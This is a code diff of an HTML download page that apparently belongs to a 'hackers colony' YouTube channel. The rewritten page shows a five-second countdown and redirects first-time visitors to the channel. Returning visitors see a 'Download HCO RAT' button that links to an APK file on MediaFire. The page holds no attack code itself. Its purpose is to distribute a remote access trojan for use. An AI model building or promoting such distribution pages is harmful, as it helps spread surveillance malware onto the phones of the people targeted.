@@ -2,104 +2,81 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Unlock Download</title>
+  <title>HCC | Redirect + Download</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       margin: 0;
       padding: 0;
-      background: linear-gradient(135deg, #0d0d0d, #1c1c1c);
-      font-family: 'Segoe UI', sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
       color: #fff;
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
-    }
-
-    .container {
       text-align: center;
-      background: #111;
-      padding: 40px 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,255,180,0.2);
+      flex-direction: column;
     }
-
-    h1 {
-      font-size: 28px;
-      color: #00ffc8;
+    .countdown {
+      font-size: 2em;
       margin-bottom: 20px;
     }
-
-    #timer {
-      font-size: 40px;
-      color: #ffcc00;
-      margin: 20px 0;
-    }
-
-    .note {
-      font-size: 14px;
-      color: #aaa;
-    }
-
-    #downloadBtn {
+    .hidden {
       display: none;
-      margin-top: 25px;
-      padding: 14px 32px;
-      background-color: #00ffc8;
-      color: #000;
-      font-size: 18px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: 0.3s ease;
     }
-
-    #downloadBtn:hover {
-      background-color: #00e6b0;
-      box-shadow: 0 0 10px #00ffc8;
+    .btn {
+      padding: 15px 30px;
+      font-size: 1.2em;
+      background: #00c6ff;
+      background: linear-gradient(to right, #0072ff, #00c6ff);
+      color: white;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      transition: transform 0.2s ease;
+    }
+    .btn:hover {
+      transform: scale(1.05);
     }
   </style>
 </head>
 <body>
+  <div id="countdownPage">
+    <h1>Welcome to HCO Website</h1>
+    <p class="countdown">Redirecting in <span id="counter">5</span> seconds...</p>
+  </div>
 
-  <div class="container">
-    <h1 id="mainHeading">Preparing your download...</h1>
-    <div id="timer">10</div>
-    <button id="downloadBtn" onclick="redirectToDownload()">Download Now</button>
-    <p class="note" id="noteText">Please wait while we verify your subscription...</p>
+  <div id="downloadPage" class="hidden">
+    <h1>Welcome Back!</h1>
+    <p>Click below to download HCO RAT</p>
+    <button class="btn" onclick="window.location.href='https://www.mediafire.com/file/oghfpaq7rjef928/%25F0%259D%2590%2587%25F0%259D%2590%2582%25F0%259D%2590%258E_%25F0%259D%2590%2591%25F0%259D%2590%2580%25F0%259D%2590%2593_1.0.apk/file'">
+      Download HCO RAT
+    </button>
   </div>
 
   <script>
-    const downloadLink = "https://www.mediafire.com/file/oghfpaq7rjef928/%25F0%259D%2590%2587%25F0%259D%2590%2582%25F0%259D%2590%258E_%25F0%259D%2590%2591%25F0%259D%2590%2580%25F0%259D%2590%2593_1.0.apk/file";
-    const youtubeChannel = "https://www.youtube.com/@hackers_colony_tech";
+    // Check if user already visited once (coming back from YouTube)
+    const visited = sessionStorage.getItem('visitedOnce');
 
-    function redirectToDownload() {
-      window.location.href = downloadLink;
-    }
-
-    // First-time visitor (no "step=2")
-    if (!window.location.search.includes("step=2")) {
-      let seconds = 10;
-      const timerEl = document.getElementById("timer");
-
-      const countdown = setInterval(() => {
-        seconds--;
-        timerEl.textContent = seconds;
-
-        if (seconds <= 0) {
-          clearInterval(countdown);
-          window.location.href = youtubeChannel;
+    if (!visited) {
+      // First time visit, show countdown and redirect
+      let counter = 5;
+      const interval = setInterval(() => {
+        counter--;
+        document.getElementById('counter').innerText = counter;
+        if (counter <= 0) {
+          clearInterval(interval);
+          sessionStorage.setItem('visitedOnce', 'true');
+          window.location.href = 'https://youtube.com/@hackers_colony_tech?si=mgIQkRne76fz6_GC';
         }
       }, 1000);
     } else {
-      // Returned from YouTube
-      document.getElementById("mainHeading").textContent = "Download Ready!";
-      document.getElementById("timer").style.display = "none";
-      document.getElementById("noteText").textContent = "Click the button below to download your file.";
-      document.getElementById("downloadBtn").style.display = "inline-block";
+      // User came back, show download button
+      document.getElementById('countdownPage').classList.add('hidden');
+      document.getElementById('downloadPage').classList.remove('hidden');
     }
   </script>
-
 </body>
 </html>
